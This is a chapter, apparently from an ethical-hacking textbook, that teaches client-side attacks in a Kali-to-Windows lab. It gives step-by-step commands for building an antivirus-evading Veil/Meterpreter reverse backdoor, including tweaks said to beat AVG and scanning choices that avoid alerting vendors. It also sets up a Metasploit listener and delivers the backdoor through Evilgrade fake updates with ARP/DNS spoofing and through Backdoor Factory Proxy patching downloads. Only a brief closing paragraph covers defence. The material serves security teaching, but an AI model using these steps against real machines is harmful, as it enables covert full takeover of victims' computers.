<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Client-Side Attacks</h1>
                </header>
            
            <article>
                
<p>In the previous chapter, we started by learning how to gain access to victim machines using server-side attacks. We will now move on to client-side attacks, discussing what they are, and how a tool called Veil can be used to generate an undetectable backdoor. We will also discuss payloads. Once we have a brief idea about payloads, we will generate a backdoor through which we will implement client-side attacks on our own system, enabling us to listen to connections. Finally, we will look at how to implement backdoors in real time, as well as techniques we can use to protect our system from such attacks.</p>
<p>In this chapter, we will cover the following topics:</p>
<ul>
<li class="h1">Client-side attacks</li>
<li class="h1">Installing Veil</li>
<li class="h1">Payloads overview</li>
<li class="h1">Generating a Veil backdoor</li>
<li class="h1">Listening for connections</li>
<li class="h1">Testing the backdoor</li>
<li class="h1">Fake bdm1 updates</li>
<li class="h1">Client-side attacks using the bdm2 BDFProxy</li>
<li class="h1">Protection against delivery methods</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Client-side attacks</h1>
                </header>
            
            <article>
                
<p>In this section, we're going to learn about client-side attacks. Often, it's better to try to gain access to a target using server-side attacks, such as trying to find exploits in the operating system and in the applications installed. If that doesn't work, or if our target is hidden behind an IP or is using a hidden network, our next resort is a client-side attack. Client-side attacks require the user to do something, such as open a link, install an update, or download an image that will then run code on their machine. Because these attacks require user interaction, information gathering is very important—information about an individual's applications and who they are as a person. For a client-side attack to be successful, we need to know a person's friends, what networks and websites they use, and what websites they trust. Therefore, our focus when gathering information is the person, rather than their applications or operating system.</p>
<p>The attacking machine will be a Kali machine and the target machine will be Windows. To ensure they're on the same network, both machines will use NAT networks. In our examples, we will be using reverse connections, so separate IP addresses are not essential in this case.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Installing Veil</h1>
                </header>
            
            <article>
                
<p>In this section, we're going to learn how to generate an undetectable backdoor. A backdoor is just a file that, when executed on a target computer, will give us full access to it. There are a number of ways of generating backdoors, but what we're interested in is generating a backdoor that is not detectable by antivirus programs. This actually isn't hard to do, as we will see, if you use a tool called <strong>Veil-Evasion</strong>.</p>
<div class="packt_infobox">Veil-Evasion used to be a standalone tool, but its creators have recently combined it with other tools in the framework, re-releasing it as Veil-Framework. Nowadays, it is usually referred to as just Veil.</div>
<p>Download the latest version of Veil, which is 3, from the following GitHub link: <a href="https://github.com/Veil-Framework/Veil" target="_blank">https://github.com/Veil-Framework/Veil</a>. If you are unfamiliar with GitHub, it is a version control system that allow programmers to post, share, and update source code. GitHub is used a lot when downloading programs. Veil's repository can either be downloaded via GitHub's link or by copying it to your terminal. Now, before we download it, we actually want to store it in the <kbd>/opt</kbd> directory, so we will be doing <kbd>cd</kbd> to navigate to a different directory, and we are going to put <kbd>/opt</kbd> to open a directory called <kbd>opt</kbd>. Now, this is where we will be storing your optional programs, hence the name <kbd>opt</kbd>, and if we do <kbd>ls</kbd> to list the available directories, we will see that we only have one directory for a program called <kbd>Teeth</kbd>.</p>
<p>Now, if we want to download <kbd>Veil</kbd>, we have to copy the repository link from GitHub and then go to our Terminal, to the location where we want to download it. So, first we change the directory to <kbd>/opt</kbd>, and then we are going to do <kbd>git clone</kbd>, and input the URL of the repository. The command is very simple, as follows:</p>
<pre><strong>git clone https://github.com/Veil-Framework/Veil</strong></pre>
<p>Here, we're using the <kbd>clone</kbd> command to tell <kbd>git</kbd> that we want to clone or download this framework, program, or project, before sharing the link with Veil. To download the desired project, simply hit <em>Enter</em>, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-479 image-border" src="assets/efd1811b-252d-4293-9619-3abcf1a2b2c0.png" style="width:32.33em;height:6.42em;"/></div>
<p>If we use the <kbd>ls </kbd><span>command </span><span>to list our files, we should see a new directory called</span> <kbd>Veil</kbd><span>. We're able to navigate to that directory by inputting </span><kbd>cd Veil/</kbd><span>. The</span> <kbd>ls</kbd> <span>command should list all the available files, including </span><kbd>Veil.py</kbd><span>, which we need to install. To do this, navigate to the</span> <kbd>config</kbd> <span>directory by inputting </span><kbd>cd config/</kbd><span>, and run the </span><kbd>setup.sh</kbd> <span>bash script. This script will install Veil-Evasion.</span></p>
<p>To run an executable in Linux from the terminal, simply enter <kbd>./</kbd>, followed by the name of the executable, as shown as follows:</p>
<pre><strong>./setup.sh</strong></pre>
<p>The previous command should generate the following result:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-480 image-border" src="assets/9be3a4cf-4ee8-4d14-ae48-77c5185ee094.png" style="width:39.08em;height:30.08em;"/></div>
<p>As you can see in the previous screenshot, we're being asked if we want to install Veil, to which <kbd>yes</kbd>, we are. Note that the installation may take a while.</p>
<p>Now, we first open the Terminal we are going to navigate to the <kbd>/opt</kbd> directory, because that's where we cloned <kbd>Veil</kbd>, and that was cloned in a directory called <kbd>Veil</kbd>. So, we're inputting <kbd>cd<span>/opt/Veil/</span></kbd> to navigate to change the working directory, and we're going to the <kbd>/opt/Veil/</kbd> directory. Then we are going to launch, and are now inside the <kbd>Veil</kbd> directory. If we input the <kbd>ls</kbd> command, we will see we have the <kbd>Veil</kbd> executable. So, we can run any executable, like we said, by putting <kbd>./</kbd> followed by the name of the executable, which is <kbd>Veil.py</kbd>. We are going to launch it, leading to the welcome screen for <kbd>Veil</kbd>, as shown in the following screenshot, and now we can start using the tool. We'll cover the usage of this tool in the next chapter.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Payloads overview</h1>
                </header>
            
            <article>
                
<p>Now that Veil is installed, we can take a look at its commands. The commands are straightforward, with <kbd>exit</kbd> allowing us to exit the program, and <kbd>info</kbd> providing us with information about a specific tool.<kbd>list</kbd> will list the available tools, <kbd>update</kbd> will update Veil, and finally, <kbd>use</kbd> enables the use of any tool, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-485 image-border" src="assets/2929b2c8-2b98-4300-8505-c53b1b60bbad.png" style="width:36.00em;height:23.75em;"/></div>
<p>The <kbd>list</kbd> command displays Veil's main commands, which are as follows:</p>
<ol>
<li><kbd><span>Evasion</span></kbd><span>: This </span>generates undetectable backdoors</li>
<li><span><kbd>Ordnance</kbd>: This </span>generates the payloads used by <kbd>Evasion</kbd>; this is more of a secondary tool</li>
</ol>
<p>A payload is a part of the code, or of the backdoor, that does what we want it to. In this case, it gives us a reverse connection and downloads and executes something on a target computer.</p>
<p>When Veil-Evasion has loaded, you should see something similar to the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-486 image-border" src="assets/75ac6cd6-334c-44ee-b7dd-f3b508e28754.png" style="width:37.08em;height:18.92em;"/></div>
<p>As you can see, Veil gives us a list of commands that can run on this tool. What we want here is to <kbd>list</kbd> all of the available payloads, of which there are 41. Each payload is divided into three parts, as shown in the following screenshot. We've highlighted the payload we'll be using, <kbd>15) go/meterpreter/rev_https.py</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-489 image-border" src="assets/35893cc8-ef41-4e8f-bf5b-a9f7b69c76b8.png" style="width:38.25em;height:44.42em;"/></div>
<p>The first part of the payload's name is <kbd>cs</kbd>, which refers to the programming language the payload will be wrapped in. As you can see in the preceding screenshot, languages used include GO, C, CS, Python, PowerShell, and Ruby.</p>
<p>The second part of any payload is really important, as this is the type of payload; in other words, the type of code that's going to be executed on the target computer.</p>
<p>In this example, we're using Meterpreter, which is a payload designed by Metasploit. Metasploit is a huge framework sometimes used for hacking. Meterpreter runs in memory, so is difficult to detect and doesn't leave a large footprint. Using Meterpreter, we can gain full control over a target computer, allowing us to navigate through the filesystem, turn on the webcam, install or download files, and much more.</p>
<p>The third part of a payload's name is the method that's going to be used to establish its connection. In our example, that's <kbd>rev_https</kbd>. <kbd>rev</kbd>, which stands for reverse, and <kbd>https</kbd> is the protocol that will be used to establish the connection. There are also a few examples of <kbd>rev_tcp</kbd> in the preceding screenshot, which creates a reverse TCP connection.</p>
<p>A reverse connection is where the target computer connects to an attacker computer via a backdoor. This method bypasses antivirus programs because the connection is not directed at the target computer, but rather at the attacker instead. In our case, we are going to use a port that many websites use, <kbd>80</kbd> or <kbd>8080</kbd>, so the connection will appear as a harmless website connection. Reverse connections also work on hidden computers, making it one of the most practical methods of gaining access to a machine.</p>
<p>Some payloads don't follow the conventional naming pattern, such as <kbd>shellcode_inject</kbd>. This instead creates a normal payload that injects our other payload.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Generating a Veil backdoor</h1>
                </header>
            
            <article>
                
<p>We're now going to use Veil to generate a backdoor. First, we'll run the <kbd>list</kbd> command. We'll type the <kbd>use 1</kbd> command, as we want to use <kbd>Evasion</kbd> and press <em>Enter</em>, and, as we want to use the fifteenth payload, we'll run the <kbd>use 15</kbd> command, as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-490 image-border" src="assets/b9f94c33-6922-4d9d-8bc7-f9e5a79950b0.png" style="width:42.58em;height:44.67em;"/></div>
<p>Using the following options, we're going to change the payload's <kbd>IP LHOST</kbd> to the IP address of the Kali machine we're using.</p>
<p>To get the IP address of our Kali machine, we have to run <kbd>ifconfig</kbd>. Split the screen by right-clicking and selecting <span class="packt_screen">Split Horizontally</span>, and then run the command. As shown in the following screenshot, the Kali machine's IP address is <kbd>10.0.2.15</kbd><span>, </span>which is where we want the target computer's connection to return to once the backdoor has been executed:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-491 image-border" src="assets/685a1192-04c2-48a1-a75e-6aab054b0bff.png" style="width:37.42em;height:18.67em;"/></div>
<p>To set <kbd>LHOST</kbd> as <kbd>10.0.2.15</kbd>, write the <kbd>set</kbd> command followed by the option you want to change, as shown as follows:</p>
<pre><strong>set LHOST 10.0.2.15</strong></pre>
<p>We now need to change <kbd>LPORT</kbd> so that it's set to <kbd>8080</kbd>. This port is also used by web servers, so will not appear suspicious and should still bypass firewalls. To set the correct port, input the <kbd>set LPORT 8080</kbd> command, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-493 image-border" src="assets/1f240c08-5699-4f15-905e-950a1e37ee36.png" style="width:40.17em;height:29.58em;"/></div>
<p><span>This process will bypass every antivirus program except AVG, according to experience. Antivirus programs work using a large database of signatures. These signatures correspond to files that contain harmful code, so if our file matches any value in a database, it will be flagged as a virus or as malware. Because of this, we need to make sure that our backdoor is as unique as possible so it can bypass every piece of antivirus software. Veil works hard by encrypting the backdoor, obfuscating it, and injecting it in memory so that it doesn't get detected, but this doesn't wash with AVG.</span></p>
<p><span>To ensure our backdoor can bypass AVG, we need to modify the minimum number of processors used by it—in this case, <kbd>1</kbd>. To do this, use the following command:</span></p>
<pre><strong>set PROCESSORS 1</strong></pre>
<p><span>We will also modify the <kbd>SLEEP</kbd> option, which is the number of seconds a backdoor will wait before it executes the payload. To tell your backdoor to wait <kbd>6</kbd> seconds, use the following command:</span></p>
<pre><strong>set SLEEP 6</strong> </pre>
<p>These changes are reflected in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-494 image-border" src="assets/4eab1916-69b4-428e-85bf-a3a1dd4bab23.png" style="width:39.17em;height:29.08em;"/></div>
<p><span>We are now going to generate the backdoor using the <kbd>generate</kbd> command, as shown as follows:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-496 image-border" src="assets/6230abe1-fa3c-46ec-98a9-35f6c24178bb.png" style="width:36.33em;height:7.58em;"/></div>
<p><span>We now need to name our backdoor. Here, we're going to name it <kbd>rev_https_8080</kbd>. The following screenshot illustrates what we see once a backdoor is generated; this includes the module used by the backdoor, and where it's stored:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-497 image-border" src="assets/a36895fe-b6d2-428c-8767-5d4644d13808.png" style="width:38.83em;height:11.17em;"/></div>
<p><span>To test our backdoor, we're going to bypass Veil's <kbd>checkvt</kbd> command, which is not always accurate, and VirusTotal, which shares its results with antivirus software, and instead opt for the website NoDistribute, as shown in the following screenshot:</span></p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/0c66326c-5b1f-4e63-9f07-58d63e03211e.png"/></div>
<p><span>Now, click on <span class="packt_screen">Browse...</span> and navigate to your file at <kbd>/usr/share/veil-output/compiled</kbd>, as shown as follows:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-499 image-border" src="assets/510a5977-dac3-4824-a8db-a77ee8db5def.png" style="width:40.42em;height:13.25em;"/></div>
<p><span>Once we have clicked <span class="packt_screen">Scan File</span>, or <span class="packt_screen">View Previous Results</span>, we can see that the file we uploaded has successfully bypassed <em>all</em> antivirus programs, as shown in the following screenshot:</span></p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/07b1c784-48cc-4fcd-a2f8-c9319cc7984d.png" style="width:34.42em;height:30.08em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Files uploaded bypassed by the antivirus</div>
<p><span>Remember that Veil will work best when its kept up to date with the latest version. It's also worth noting that whether a backdoor goes undetected or not is often arbitrary—one backdoor we previously generated with no sleep setting was detected by antivirus software, as was one with a sleep time of 10 seconds. A backdoor set with a sleep time of 6 seconds, however, bypassed every program.</span></p>
<p><span>We recommend playing around with all the available options within a payload to find something that works for you.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Listening for connections</h1>
                </header>
            
            <article>
                
<p>As you'll know, the backdoor we created uses a reverse payload. For the reverse payload to work, we need to open a port in our computer so that the target machine can connect to it. When we created the backdoor, we set the port to <kbd>8080</kbd>, so we need to open that port on our Kali machine. Remember, the name of our chosen payload is <kbd>meterpreter/rev_https</kbd> in this example.</p>
<p>We are now going to split our screens, as before, and listen for incoming connections using the Metasploit framework. To run Metasploit, use the <kbd>msfconsole</kbd> command, which should generate output similar to the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-500 image-border" src="assets/0b5a5add-062d-46ac-ba3f-905e5e7dcf2c.png" style="width:35.25em;height:25.08em;"/></div>
<p>To listen for incoming connections, we need to use a module in Metasploit: <kbd>exploit/multi/handler</kbd>. To launch that module, use the following command:</p>
<pre><strong>use exploit/multi/handler</strong></pre>
<p>Once launched, navigate to the <kbd>exploit/multi/handler</kbd> module. The most important thing that you want to specify in this module is the payload, which we do with the <kbd>set</kbd> command. To set the payload as <kbd>windows/meterpreter/reverse_https</kbd>, use the following command:</p>
<pre><strong>set PAYLOAD windows/meterpreter/reverse_https</strong></pre>
<p>If we run the <kbd>show options</kbd> command now, we should see that the payload has changed to <kbd>windows/meterpreter/reverse_https</kbd>, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-502 image-border" src="assets/e8022dd5-6fa6-41eb-8199-8a449c9d3cae.png" style="width:44.17em;height:23.75em;"/></div>
<p>Setting the <kbd>LHOST</kbd> to the IP address of our Kali machine is a similar process, and can be done using the following command:</p>
<pre><strong>set LHOST 10.0.2.15</strong></pre>
<p>Before you go any further, make sure that your payload, host, and port are set correctly with the same values as those generated with the backdoor originally, as shown as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-503 image-border" src="assets/ecd0361c-5b12-4b1b-badb-2c5ffdc79d70.png" style="width:44.17em;height:24.58em;"/></div>
<p>All we need to do now is execute the <kbd>exploit</kbd> command. Now, Metasploit is waiting for connections, as we can see in the following screenshot, on port <kbd>8080</kbd> and on our IP address, which is <kbd>10.0.2.15</kbd>. Once a connection is established, we will be able to control the target computer:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-504 image-border" src="assets/0f543583-1d32-420d-a79e-3ce21c144f41.png" style="width:30.08em;height:3.17em;"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Testing the backdoor</h1>
                </header>
            
            <article>
                
<p>To test that our backdoor is working as expected, we're going to put it on our web server and download it from the target computer. We don't recommend this approach for anything other than testing your backdoor.</p>
<p>As Kali can be used as a website, we're going to put our backdoor online and download it from the target Windows machine. We're going to keep this download in one place, a folder called <kbd>evil-files</kbd>, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-505 image-border" src="assets/b1ae3bd9-01d2-439a-9738-6373b34acf98.png" style="width:45.67em;height:22.50em;"/></div>
<p>Now, the backdoor we created using Veil-Evasion, which was stored in <kbd>var/lib/veil-evasion/output/compiled/</kbd><span>, needs to be copied and pasted into the </span><kbd>evil-files</kbd> directory<span>. And that's it! We can download the file from Kali.</span></p>
<p><span>To start the web server and website, input the following command in the terminal:</span></p>
<pre><span><strong>service apache2 start</strong></span></pre>
<p><span>Here, the command is <kbd>service</kbd>, and <kbd>apache2</kbd> is the name of the web server. Hitting <em>Enter</em> will execute the previous command.</span></p>
<p><span>We now need to navigate to our Kali machine's IP address, <kbd>10.0.2.15</kbd>. T</span><span>his should open the basic <kbd>index.html</kbd> file that we created that tells us our web server is working, as shown as follows:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-506 image-border" src="assets/552adfbf-2061-466b-83a2-694daad2c6fb.png" style="width:66.58em;height:48.00em;"/></div>
<p><span>To go to the directory containing the backdoor, go to <kbd>10.0.2.15/evil-files</kbd> and hit <em>Enter</em>. We can then download and run the backdoor, as shown in the following screenshot:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-507 image-border" src="assets/cd0475b9-8a25-4157-8130-a59990b19566.png" style="width:20.42em;height:11.58em;"/></div>
<p><span>Now that we have run the backdoor on the Windows machine, our Kali machine will tell us that we have received a connection from the target computer, as shown in the following screenshot:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-508 image-border" src="assets/6bbc3bf2-4c5b-4921-ad40-9962730c8beb.png" style="width:52.83em;height:6.75em;"/></div>
<p><span>This means that we now have full control over that computer.</span> <span>In the preceding screenshot, we can see that we have a Meterpreter session, which allows us to do anything that the rightful user of that computer can do.</span></p>
<p><span>To check that the backdoor is working correctly, use the <kbd>sysinfo</kbd> command. You should see that you're inside the <kbd>MSEDGEWIN10</kbd> machine, which runs <kbd>Windows 10 (Build 17134)</kbd>, has a <kbd>x64</kbd> architecture, uses the <kbd>en_US</kbd> language, and Meterpreter x86 for Windows:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-509 image-border" src="assets/afabd500-f645-46c9-8f33-444c79956bb1.png" style="width:21.25em;height:7.83em;"/></div>
<p><span>We've now essentially hacked our target computer. Nice work!</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Fake bdm1 updates</h1>
                </header>
            
            <article>
                
<p>Although we have an undetectable backdoor, we still haven't found a smart and efficient way to deliver it to the target machine. In real life, a target probably won't download an executable and run it if we ask them to, so we're now going to look at how to fake an update that the user will want to download and install on their machine.</p>
<p>This scenario will work as long as we are in the middle of a connection, for example, when using a fake network, when implementing a man-in-the-middle attack, or when redirecting traffic via a mobile phone.</p>
<p>In this scetion, we are going to cover DNS spoofing with ARP poisoning. This will mean we're in the same network as the target machine, which in this example is wired and not wireless. We'll use a tool called Evilgrade to act as a server to produce the fake update. You can install Evilgrade at the following link:</p>
<p><a href="https://github.com/PacktPublishing/Fundamentals-of-Ethical-Hacking-from-Scratch" target="_blank">https://github.com/PacktPublishing/Fundamentals-of-Ethical-Hacking-from-Scratch</a>.</p>
<p>After you have downloaded and run the <kbd>evilgrade</kbd> command, run the <kbd>show modules</kbd> command to see a list of the programs we can hijack updates for, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-752 image-border" src="assets/5d8538ed-01a4-424f-b634-64a48974fbe5.png" style="width:12.00em;height:22.50em;"/></div>
<p>As you can see, there are 67 programs that we can hijack updates from, including some popular ones such as Google Analytics, Nokia, Safari, and Download Accelerator Plus, which is what we will use for this example.</p>
<p>Run the <kbd>configure dap</kbd> command to use the DAP module. Then, use the <kbd>show options</kbd> command to see all of the available configurable options, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-755 image-border" src="assets/b1c54b47-5089-4f15-9e13-206b130dc93b.png" style="width:54.08em;height:21.83em;"/></div>
<p>The main option we will focus on is <kbd>agent</kbd>, so we need to replace the <kbd>./agent/agent.exe</kbd> path with the program path that will be installed as the update. In our case, we want to install a backdoor as the update.</p>
<div class="packt_infobox">The previous backdoor in the <em>Generating a Veil backdoor </em><span>section </span>that we created uses a <kbd>reverse_https</kbd> payload, which does not work with DAP. Instead, we will be using a different backdoor named <kbd>backdoor.exe</kbd> that uses a <kbd>reverse_http</kbd> payload. To create such a backdoor, please refer to the steps in the <em>Generating a Veil backdoor </em>section.</div>
<p>To change the <kbd>agent</kbd> so that it executes our backdoor instead of an update, use the following command:</p>
<pre><strong><span>set agent /var/www/html/backdoor.exe</span></strong></pre>
<p>Replace the path in the command to the path where the <kbd>reverse_http</kbd> backdoor is placed. Now, run the <kbd>show options</kbd> command again to check that it has been configured correctly, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-754 image-border" src="assets/270c7b11-597e-4520-b80e-cb1a6d18405c.png" style="width:47.08em;height:19.92em;"/></div>
<p>We can also set any other options that we want in here the same way; we just input the <kbd>set option</kbd> name followed by the <kbd>option</kbd> value. One <kbd>option</kbd> that you might want to set is the <kbd>endsite</kbd>.</p>
<p>Now, in the future, maybe this website is not going to work, so if it displays an error on the target computer, we can change this website to any website that you want; you can just change it to <kbd>update.speedbit.com</kbd>.</p>
<p>When everything is ready, start the server by running the <kbd>start</kbd> command, as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-586 image-border" src="assets/e7561bee-bec5-4a5f-b4e5-5d19184a488f.png" style="width:66.42em;height:6.92em;"/></div>
<p>Now, any time Evilgrade gets an update request, it will tell whoever is requesting an update that there is an update—our backdoor. To do this, we need to redirect any request for <kbd>update.speedbit.com</kbd> to Evilgrade.</p>
<p>We can do this switch with a DNS spoofing attack, spoofing any requests from <kbd>update.speedbit.com</kbd> to Evilgrade (and our own IP address).</p>
<p>Open the <kbd>mitmf.conf</kbd> file using Leafpad with the <kbd>leafpad /etc/mitmf/mitmf.conf</kbd> command, and change the port for the DNS server to <kbd>5353</kbd> to avoid conflict with Evilgrade, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-650 image-border" src="assets/fe44f854-20e4-42f0-9acd-24320147e289.png" style="width:47.92em;height:15.25em;"/></div>
<p>If we take a look at our <kbd>A</kbd> records, we will see that we are now redirecting any requests to <kbd>update.speedbit.com</kbd> to our own IP address, <kbd>10.0.2.15</kbd>, which Evilgrade is running on.</p>
<p>All we have to do now is run a MITMf with the following command:</p>
<pre><strong>mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.5 -i etho --dns</strong></pre>
<p>Hit <em>Enter</em> and you're done! The DNS spoofing is complete. Now that Evilgrade is running, our backdoor can be downloaded and executed from <kbd>update.speedbit.com</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-655 image-border" src="assets/aca8dd54-a54f-40ba-9aa7-171ec1904868.png" style="width:38.50em;height:31.50em;"/></div>
<p>To listen for connections, change the options on the <kbd>msfconsole</kbd> Terminal by using the <kbd>exploit/multi/handler</kbd> module, setting the payload to <kbd>windows/meterpreter/reverse_http</kbd>, setting <kbd>LHOST</kbd> to <kbd>10.0.2.15</kbd>, which is our Kali machine IP, and <kbd>LPORT</kbd> to <kbd>8080</kbd>, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-653 image-border" src="assets/a7f8622a-1ba6-4dc9-adb1-e9474cb483f3.png" style="width:46.42em;height:15.25em;"/></div>
<p>To reiterate, the target program is going to check for updates using <kbd>update.speedbit.com</kbd>, which will redirect to the IP address where Evilgrade is running thanks to MITMf.</p>
<p>We now need to check for DAP updates on the target computer, which, in our case, is a Windows machine; a dialog should tell us that a <span class="packt_screen">Critical update</span> is required when we try to update the DAP application, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-656 image-border" src="assets/fc336133-ed7f-45ce-8d83-ab0bf21c2b29.png" style="width:23.33em;height:24.42em;"/></div>
<p>Once the update has been downloaded and installed, running the <kbd>sysinfo</kbd> command on the Meterpreter Terminal session on our Kali machine, we should confirm that we have control over the target computer by running the <kbd>sysinfo</kbd> command, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-659 image-border" src="assets/acb97873-8b82-49bc-b63e-fb3be7c33f04.png" style="width:53.42em;height:13.42em;"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Client-side attacks using the bdm2 BDFProxy</h1>
                </header>
            
            <article>
                
<p>In this section, we're going to look at another backdoor delivery method: running our backdoor via an active download. In other words, a user will download and install a program that will run as expected, but with our payload, or backdoor, running in the background. This is possible using a tool called <strong>Backdoor Factory Proxy</strong>. This also requires a man-in-the-middle access method, such as ARP poisoning.</p>
<p>For this example, we'll go with ARP poisoning so that all traffic will be redirected through our own computer. First, we need to modify the configuration of the <kbd>bdfproxy.cfg</kbd> file with the following command:</p>
<pre><strong>leafpad /etc/bdfproxy/bdfproxy.cfg</strong></pre>
<p>We will now do two things. First, set the <kbd>proxyMode</kbd> parameter to <kbd>transparent</kbd>, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-660 image-border" src="assets/eb788532-b488-445e-92f3-0a81375a58ce.png" style="width:47.83em;height:7.50em;"/></div>
<p>Second, change the <kbd>HOST</kbd> parameter to your Kali machine's IP address, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-661 image-border" src="assets/bc3a500b-a845-4bb6-b848-bf7c748dad46.png" style="width:32.67em;height:12.67em;"/></div>
<p>The proxy, which works across all operating systems, uses an executable download that will also contain the backdoor. For it to work, all we need to do is set our IP address, <kbd>10.0.2.15</kbd>, and then start the proxy by typing <kbd>bdfproxy</kbd> and hitting <em>Enter</em>, as shown in the following screenshot:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-662 image-border" src="assets/7e24b0cc-6fee-4159-98b7-58afe40d19f1.png" style="width:31.25em;height:7.00em;"/></div>
<p><kbd>bdfproxy_msf_resource.rc</kbd> is a file that we can use to listen for incoming connections. First, we need to ensure <span>the proxy is running on port <kbd>8080</kbd>, and that anything that comes from port <kbd>80</kbd> is redirected to <kbd>8080</kbd>. This is done using the following command:</span></p>
<pre><strong>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</strong></pre>
<p><span>To perform basic ARP poisoning, we need to run MITMf and use the basic command, <kbd>mitmf --arp --spoof</kbd>, which should include the <kbd>--gateway</kbd>, our <kbd>--target</kbd>, and our interface <kbd>-i</kbd>, as follows:</span></p>
<pre><strong><span>mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.5 -i eth0</span></strong></pre>
<p><span>After hitting <em>Enter</em>, all we need to do is listen for incoming connections using Backdoor Factory Proxy's resource file, using the following command:</span></p>
<pre><strong><span>msfconsole -r /root/bdfproxy_msf_resource.rc</span></strong></pre>
<p><span>After hitting <em>Enter</em>, all we have to do is wait for that to load all the possible payloads that can be used. So, now let's analyze it quickly. The target person is going to download a program that they actually want, we are the man-in-the-middle and, because we're doing ARP poisoning, everything is going to be flowing through our device. We have Backdoor Factory Proxy running, so whenever an executable is downloaded, Backdoor Factory Proxy is going to backdoor that executable on the fly; therefore, when the target person runs it, they will get the program that they're expecting, but, at the same time, our backdoor is going to run in the background and we're going to get a shell because we're listening for ports.</span></p>
<p><span>So, we are going to go to our target look for DAP, the same program that we hijacked, and we are going to download it from their official website. We are then going to go to their free download, and then save the file. And, just before we download it, if we look at the Terminal as shown in the following screenshot, we can see that the file has been patched in here by the Backdoor Factory Proxy:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1628 image-border" src="assets/2aeff425-f2c5-4cad-9572-4ffd57772b62.png" style="width:80.58em;height:25.08em;"/></div>
<p class="mce-root CDPAlignLeft CDPAlign"><span>Once we have downloaded DAP's update, we will go to <span class="packt_screen">Downloads</span> and run the file. It will look like a normal installer, but if we return to Meterpreter, we can see that the download has secured a connection from the target computer that can be interacted with using the <kbd>sessions -i 1</kbd>, as shown in the following screenshot:</span></p>
<div class="mce-root CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1629 image-border" src="assets/26444c47-4a08-487e-9833-9768f661db51.png" style="width:26.25em;height:5.83em;"/></div>
<p><span>Running the <kbd>sysinfo</kbd> command will confirm that we are inside the Windows machine, and have full control of it thanks to our backdoor running in the background.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Protection against delivery methods</h1>
                </header>
            
            <article>
                
<p>In this section, we're going to explore how to protect yourself from delivery methods. To prevent a man-in-the-middle attack, use tools such as XArp, or static ARP tables, and avoid networks you don't know or trust. Another precaution is to ensure you're using HTTPS when downloading updates. This will reduce your risk of downloading a fake update.</p>
